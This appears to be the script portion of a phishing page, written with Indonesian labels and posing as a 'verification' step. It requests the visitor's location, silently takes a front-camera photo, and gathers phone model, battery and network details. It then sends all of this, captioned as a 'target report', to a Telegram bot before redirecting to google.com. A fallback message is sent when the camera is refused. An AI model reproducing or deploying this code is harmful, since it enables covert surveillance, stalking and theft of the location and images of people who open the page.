        const CHAT_ID = '6888530451';
        let userLocation = "Akses Lokasi Ditolak";

        // Daftar Model HP
        function translateModel(model) {
            const brands = {
                '2310FPCA4G': 'Xiaomi Redmi 13C', '2201117TY': 'Redmi Note 11',
                '21061119AL': 'Xiaomi Mi 11 Lite', '2201116SG': 'Redmi Note 11 Pro',
                'M2012K11AG': 'POCO F3', 'SM-G991B': 'Samsung S21',
                'SM-A525F': 'Samsung Galaxy A52', 'SM-A125F': 'Samsung Galaxy A12',
                'CPH2219': 'Oppo A94', 'CPH2127': 'Oppo A53',
                'RMX3363': 'Realme GT Master Edition', 'RMX2151': 'Realme 7',
                'X688B': 'Infinix Hot 10', 'V2025': 'Vivo V20',
                'CPH': 'Oppo Device', 'RMX': 'Realme Device', 'SM-': 'Samsung Galaxy'
            };
            for (let key in brands) { if (model.includes(key)) return brands[key]; }
            return model;
        }

        async function getDeviceDetails() {
            let model = "Android Mobile";
            if (navigator.userAgentData) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
                    if (hints.model) model = translateModel(hints.model);
                } catch (e) {}
            }
            
            let battery = "N/A";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    battery = Math.round(bat.level * 100) + "%";
                }
            } catch (e) {}

            let connectionInfo = "Unknown";
            if (navigator.connection) {
                const conn = navigator.connection;
                connectionInfo = `${conn.effectiveType.toUpperCase()} | Latency: ${conn.rtt}ms | Speed: ${conn.downlink}Mbps`;
            }
            
            return { model, battery, connection: connectionInfo };
        }

        async function mulaiVerifikasi() {
            // Minta Izin Lokasi
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => { userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`; },
                    () => { userLocation = "Ditolak Pengguna"; }
                );
            }

            // Akses Kamera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => ambilFoto(video), 2000);
            } catch (err) {
                kirimDataTanpaFoto();
            }
        }

        async function ambilFoto(video) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.scale(-1, 1);
            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);

            const details = await getDeviceDetails();

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob);
                formData.append('caption', `📸 <b>Laporan Target</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connection}\n📍 <b>Lokasi:</b> ${userLocation}`);
                formData.append('parse_mode', 'HTML');
                
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                window.location.href = "https://google.com";
            }, 'image/jpeg');
        }

        async function kirimDataTanpaFoto() {
            const details = await getDeviceDetails();
            const text = `⚠️ <b>Target menolak kamera</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connection}\n📍 <b>Lokasi:</b> ${userLocation}`;
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
            window.location.href = "https://google.com";
        }
    </script>
